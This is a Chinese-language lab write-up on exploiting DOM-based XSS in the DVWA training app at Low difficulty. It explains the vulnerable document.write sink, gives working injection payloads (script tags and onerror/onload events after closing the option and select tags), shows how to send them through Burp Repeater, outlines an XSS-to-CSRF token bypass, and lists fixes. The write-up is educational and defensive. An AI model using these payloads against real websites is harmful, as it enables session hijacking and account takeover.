# XSS (DOM 型) — DVWA Low

!!! info "环境信息"

    靶场：DVWA（XAMPP + Apache + MariaDB）
    难度：Low
    地址：`http://localhost/dvwa/vulnerabilities/xss_d/`
    参数：`default`
    工具：浏览器开发者工具（F12）、Burp Suite Repeater

---

## 一、漏洞原理

### 先分清 XSS 的三种类型

| 类型 | 注入点 | 存储位置 | 服务器是否经手 |
|---|---|---|---|
| **反射型** (Reflected) | URL 参数 | 不存储 | ✅ 服务器把输入回显进 HTML |
| **存储型** (Stored) | 表单输入 | **数据库** | ✅ 服务器存储并再次输出 |
| **DOM 型** (DOM-based) | URL 参数 | 不存储 | ❌ **服务器完全不参与** |

**DOM 型 XSS 的本质**：数据从「浏览器可控的源」流向「危险的接收点（sink）」，
**全程在客户端完成，服务器的响应内容里根本不含 payload。**

### 这个模块的代码逻辑

DVWA 的 XSS (DOM) 模块，前端 JavaScript 大致是这样：

```javascript
// ① 从 URL 里取 default 参数的值
var lang = document.location.href.substring(
    document.location.href.indexOf('default=') + 8
);

// ② 把取到的值拼进 <option> 标签
document.write("<option value='" + lang + "'>" + lang + "</option>");

// ③ 再取一次，用于设置选中项
document.write("<option value='" + lang + "' selected>...</option>");
```

**三个问题叠加：**

| 环节 | 问题 |
|---|---|
| **Source（源）** | `document.location.href` —— 攻击者可通过 URL 完全控制 |
| **Sink（接收点）** | `document.write()` —— 传入的字符串会被当作 **HTML 解析** |
| **拼接方式** | 值与 `<option>` 标签拼接，且**没有任何编码或转义** |

因为字符串被拼接进 HTML 结构后由 `document.write()` 写出，
浏览器会把它当作**标记语言解析**，而不是纯文本——于是 `<script>`、`onerror` 这类东西就获得了执行能力。

!!! warning "为什么后端过滤没用"

    这是 DOM 型最需要注意的一点：

    参数 `default` **从未发送到服务器**被处理。你在 PHP 里加再多的
    `htmlspecialchars()`、WAF 规则、输入校验，**都不会生效**——
    因为漏洞发生在浏览器解析响应之后。

    要验证这一点：F12 → Network → 看 `xss_d/?default=...` 的**响应正文**，
    里面**不包含**你的 payload。payload 是在浏览器端由 JS 动态生成的。

---

## 二、利用过程

### 第 1 步：观察正常请求

访问：

```
http://localhost/dvwa/vulnerabilities/xss_d/?default=English
```

HTML 抓到的请求：

```http
GET /dvwa/vulnerabilities/xss_d/?default=English HTTP/1.1
Host: localhost
Cookie: security=low; PHPSESSID=...
Referer: http://localhost/dvwa/vulnerabilities/xss_d/
```

**注意 `default=English`** —— 这个值稍后会出现在页面的 `<select>` 下拉框里。

**查看页面源码**（F12 → Elements），能看到类似：

```html
<select name="default">
    <option value="English" selected>English</option>
</select>
```

**观察点**：`English` 这个字符串既出现在 `value=` 属性里，也出现在标签内容里。
两个位置都是注入点。

### 第 2 步：试探——看输入是否被编码

把 `default` 改成：

```
default=English'"<>test
```

**如果页面上原样出现** `English'"<>test`（没有被变成 `&quot;` `&lt;` 之类），
说明**没有任何编码**，可以注入。

!!! tip "为什么要先试这一步"

    这一步确定「编码策略」，比盲目试 payload 高效得多。

    - 原样出现 → 无过滤，随便打
    - 变成实体编码 → 需要找其他上下文或绕过
    - 被过滤/截断 → 需要分析过滤规则

### 第 3 步：构造 payload

因为值被拼进 `<option>` 标签内部，**直接插 `<script>` 可能被 HTML 解析器吞掉**
（`<select>` 内部对标签嵌套有严格限制）。

所以需要**先闭合原标签结构**：

```
English</option></select><script>alert(1)</script>
```

拼接后的 HTML 变成：

```html
<option value='English</option></select><script>alert(1)</script>'>English...</option>
```

`</option></select>` 先把原来的结构闭合，`<script>` 就落在了一个可以被解析的位置。

### 第 4 步：绕过浏览器自动编码

**这里是这个模块最容易卡住的地方。**

直接把 payload 粘进浏览器地址栏，浏览器会**自动 URL 编码**，
而且用户手动输入的 `<` `>` 在多数浏览器里会被编码成 `%3C` `%3E`，
导致 payload 到达 JS 时已经不是原始形态。

**两个可靠方案：**

**方案 A：Burp Suite Repeater（推荐）**

抓到请求后右键 → **Send to Repeater**，把请求行改成：

```http
GET /dvwa/vulnerabilities/xss_d/?default=English</option></select><script>alert(1)</script> HTTP/1.1
```

点 **Send**，payload 原样发送，不会被编码。

**方案 B：使用编码后的 URL**

```
http://localhost/dvwa/vulnerabilities/xss_d/?default=English%3C/option%3E%3C/select%3E%3Cscript%3Ealert(1)%3C/script%3E
```

| 编码 | 字符 |
|---|---|
| `%3C` | `<` |
| `%3E` | `>` |
| `%2F` | `/` |

### 第 5 步：备用 payload

`<script>` 在某些上下文里不一定执行。按可靠性排序：

| # | Payload | 说明 |
|---|---|---|
| 1 | `English</option></select><img src=x onerror=alert(1)>` | **最可靠**。标签一定能插入，`src=x` 必然加载失败，失败即触发 `onerror` |
| 2 | `English</option></select><svg onload=alert(1)>` | SVG 事件，同样不依赖 `<script>` 被解析 |
| 3 | `English</option></select><script>alert(1)</script>` | 最直观，但受解析规则限制 |
| 4 | `English"><script>alert(1)</script>` | 闭合属性值的方式 |

!!! tip "为什么优先用事件型 payload"

    `<script>` 标签有额外限制：通过 `innerHTML` 或 `document.write()` 动态插入的
    `<script>` **可能不会执行**（取决于浏览器和插入方式）。

    而 `onerror` / `onload` 这类**事件属性**只要标签被真正解析进 DOM，就会触发。

    这也是为什么真实渗透里事件型 payload 更常用。

### 第 6 步：验证

payload 生效后：

1. 页面加载时弹出 `alert(1)`
2. F12 → Elements，能看到 payload 已经**变成了真实的 DOM 元素**（不是文本）
3. F12 → Network，确认**服务器响应里没有 payload**

**第 3 点是 DOM 型的决定性证据。**

---

## 三、为什么能成功

| 环节 | 说明 |
|---|---|
| **Source 可控** | `document.location.href` 完全由 URL 决定，攻击者可任意构造 |
| **Sink 危险** | `document.write()` 把字符串当 HTML 解析，而非文本 |
| **无编码** | 拼接时没有做 HTML 实体编码 |
| **纯客户端** | 服务器无法感知，后端防护全部失效 |

**与反射型 XSS 的关键区别：**

| | 反射型 | DOM 型 |
|---|---|---|
| payload 出现在服务器响应里？ | ✅ 是 | ❌ 否 |
| 后端过滤有效？ | ✅ 有效 | ❌ **无效** |
| 防护位置 | 服务端输出编码 | **客户端安全 API** |
| 怎么发现 | 看响应内容 | **审计 JS 代码里的 source → sink 链路** |

---

## 四、修复建议

### 方案 1：用安全 API 替代危险 sink（DOM 型的根本解法）

**不要用**：

```javascript
document.write("<option value='" + lang + "'>" + lang + "</option>");
element.innerHTML = userInput;
eval(userInput);
```

**改用**：

```javascript
// 用 textContent 设置文本，不会被解析为 HTML
var option = document.createElement('option');
option.value = lang;
option.textContent = lang;      // ← 关键：按纯文本处理
selectElement.appendChild(option);
```

| 危险 sink | 安全替代 |
|---|---|
| `document.write()` | `createElement` + `appendChild` |
| `innerHTML` | `textContent` |
| `eval()` / `Function()` | 不要用；改用 JSON.parse 等 |
| `element.setAttribute('href', x)` | 校验协议白名单（只允许 http/https） |

**这是 DOM 型 XSS 唯一根治的方法** —— 因为问题不在服务器，在客户端的写法。

### 方案 2：如果确实需要插入 HTML，先做编码

```javascript
function escapeHtml(str) {
    return str.replace(/[&<>"']/g, function (c) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;',
                 '"': '&quot;', "'": '&#39;' }[c];
    });
}
```

**但要谨慎**：编码必须匹配上下文（HTML 正文 / 属性 / JS / URL 各有不同规则），
手工编码很容易漏。**优先用方案 1 的安全 API。**

### 方案 3：内容安全策略（CSP）—— 纵深防御

在 HTTP 响应头里加：

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

**效果**：即使 payload 成功注入 DOM，浏览器也**拒绝执行**内联脚本和外部脚本。

**注意**：CSP 是**第二道防线**，不能替代方案 1。它降低危害，但不修复漏洞本身。

!!! warning "CSP 的常见误区"

    如果策略里写了 `'unsafe-inline'`，等于没加——内联脚本又能跑了。

    正确做法是移除所有内联脚本，改用外部文件 + nonce/hash。

### 方案 4：`HttpOnly` Cookie

```php
session_set_cookie_params(['httponly' => true]);
```

**作用有限但值得加**：让 JS 读不到 `document.cookie`，
这样即使 XSS 成功，攻击者也偷不走会话 Cookie。

**注意**：这**不能阻止 XSS 本身**——攻击者仍能在页面上执行任意操作
（比如直接发请求改密码）。它只是让「窃取 Cookie」这条路径失效。

### 方案 5：避免把 URL 参数直接用于客户端逻辑

```javascript
// 不要：从 URL 取值后直接使用
var lang = location.href.substring(...);

// 更好：用白名单校验
var ALLOWED = { 'en': 'English', 'zh': '中文' };
var key = new URLSearchParams(location.search).get('default');
var lang = ALLOWED[key] || 'English';
```

**白名单是业务层最有效的防护** —— 参数只允许预设的几个值，攻击者无法注入任意内容。

---

## 五、三种 XSS 的防护位置对比

这是我在这一关最重要的收获：

| 类型 | 防护应该加在哪 | 为什么 |
|---|---|---|
| 反射型 | **服务端**输出编码 | payload 经服务器回显 |
| 存储型 | **服务端**输出编码 + 输入过滤 | payload 存进数据库再输出 |
| **DOM 型** | **客户端**安全 API | 服务器全程不参与，后端无感知 |

**所以"我们有 WAF 和输出编码"不能防 DOM 型 XSS。**
这也是为什么很多系统前端框架升级后仍然存在 DOM 型漏洞。

---

## 六、延伸：XSS + CSRF 组合攻击

这是 XSS 最危险的用法之一，**也是理解 CSRF 防护为什么必须加 Token 的关键**。

回到 CSRF 那一篇：High 难度加了 CSRF Token 防护。
但如果同一站点存在 XSS，攻击链条变成：

```
1. 受害者访问含 XSS 的页面
        ↓
2. 恶意 JS 执行，读取页面里的 CSRF Token
   （Token 就在 DOM 里，JS 能拿到）
        ↓
3. 用这个 Token 构造合法的改密请求
        ↓
4. CSRF Token 防护被完全绕过
```

**结论**：**CSRF Token 的前提是「攻击者读不到 Token」**，
而这依赖「站点没有 XSS」。

> **XSS 是 XSS，但它能让所有基于 Token 的防护失效。**
> 这也是为什么 XSS 长期排在 OWASP Top 10 里。

---

## 七、总结

| 要点 | 结论 |
|---|---|
| 漏洞本质 | 用户可控数据流入危险的 DOM sink，被当作代码执行 |
| 与反射型的区别 | **服务器响应里不含 payload**，后端防护无效 |
| 根本修复 | 用 `textContent` / `createElement` 替代 `document.write` / `innerHTML` |
| 纵深防御 | CSP + HttpOnly Cookie |
| 检测思路 | 审计 JS 里的 source（`location`、`referrer`…）到 sink（`innerHTML`、`eval`…）的链路 |

**我在这关学到的：**

XSS 不只是「输入 `<script>`」——**关键是要理解数据在哪个上下文里被解析**。
同样是 `<script>`，在 HTML 正文里可能执行，在属性里可能不执行，在 `<select>` 内部可能被吞掉。
**payload 要根据上下文调整。**

另一个体会：`document.write()` 这个 API 现在几乎不该出现在任何生产代码里。
看到它就基本可以确定有 DOM 型 XSS 风险。

---

## 参考

- DVWA 官方仓库：<https://github.com/digininja/DVWA>
- OWASP DOM XSS 防护速查表：<https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html>
- PortSwigger DOM XSS 专题：<https://portswigger.net/web-security/cross-site-scripting/dom-based>
